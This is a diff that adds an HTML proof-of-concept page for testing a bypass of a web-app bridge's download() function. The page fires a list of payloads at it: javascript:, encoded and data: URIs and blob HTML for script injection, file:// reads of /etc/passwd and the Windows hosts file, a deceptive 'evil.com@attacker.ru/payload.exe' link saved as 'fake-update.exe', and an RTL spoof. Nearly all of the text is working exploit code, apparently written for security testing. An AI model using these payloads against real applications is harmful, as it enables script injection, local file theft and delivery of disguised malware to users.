@@ -1,10 +1,91 @@
-<script src="https://st.max.ru/js/max-web-app.js"></script>
-<script>
-    const html = "<html><img src=x onerror=alert(1)></html>";
-    const blob = new Blob([html], { type: "text/html" });
-    const url = URL.createObjectURL(blob);
-    WebApp.downloadFile({
-        url,
-        name: "malicious.html"
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>bridge.download() Schema Bypass PoC</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
+    button { margin: 5px 0; padding: 6px 12px; font-size: 14px; cursor: pointer; }
+    .log { white-space: pre-wrap; margin-top: 20px; background: #222; padding: 10px; border-radius: 6px; }
+  </style>
+</head>
+<body>
+  <h2>bridge.download() Bypass & Exploit Tester</h2>
+
+  <div id="buttons"></div>
+
+  <div class="log" id="log">[LOG OUTPUT]</div>
+
+  <script>
+    const log = (msg) => {
+      console.log(msg);
+      document.getElementById('log').textContent += "\n" + msg;
+    };
+
+    const payloads = [
+      {
+        name: "🔴 javascript: URI",
+        url: "javascript:alert('XSS via javascript:')"
+      },
+      {
+        name: "🟠 Encoded javascript:",
+        url: decodeURIComponent("javascript%3Aalert('Encoded XSS')")
+      },
+      {
+        name: "🟡 data: URI",
+        url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+"
+      },
+      {
+        name: "🔵 blob: HTML",
+        dynamic: true,
+        content: `<html><body><script>alert('Blob XSS')</scrip</body></html>`,
+        type: "text/html",
+        filename: "blob-xss.html"
+      },
+      {
+        name: "🟤 file:///etc/passwd (Linux)",
+        url: "file:///etc/passwd",
+        filename: "passwd.txt"
+      },
+      {
+        name: "🟣 file:///Windows/hosts (Windows)",
+        url: "file:///C:/Windows/System32/drivers/etc/hosts",
+        filename: "hosts.txt"
+      },
+      {
+        name: "⚫ Obfuscated https with @",
+        url: "https://evil.com@attacker.ru/payload.exe",
+        filename: "fake-update.exe"
+      },
+      {
+        name: "⚪ Unicode spoof (RTL)",
+        url: "https://\u202Evbscript.com",
+        filename: "spoof.txt"
+      }
+    ];
+
+    const container = document.getElementById("buttons");
+
+    payloads.forEach((payload, idx) => {
+      const btn = document.createElement("button");
+      btn.textContent = `${idx + 1}. ${payload.name}`;
+      btn.onclick = () => {
+        try {
+          if (payload.dynamic) {
+            const blob = new Blob([payload.content], { type: payload.type });
+            const url = URL.createObjectURL(blob);
+            window.bridge.download({ url, name: payload.filename });
+            log(`✔ Triggered: ${payload.name} (blob: ${url})`);
+          } else {
+            window.bridge.download({ url: payload.url, name: payload.filename || "test.txt" });
+            log(`✔ Triggered: ${payload.name} → ${payload.url}`);
+          }
+        } catch (err) {
+          log(`❌ Blocked: ${payload.name} → ${err}`);
+        }
+      };
+      container.appendChild(btn);
     });
-</script>
+  </script>
+</body>
+</html>
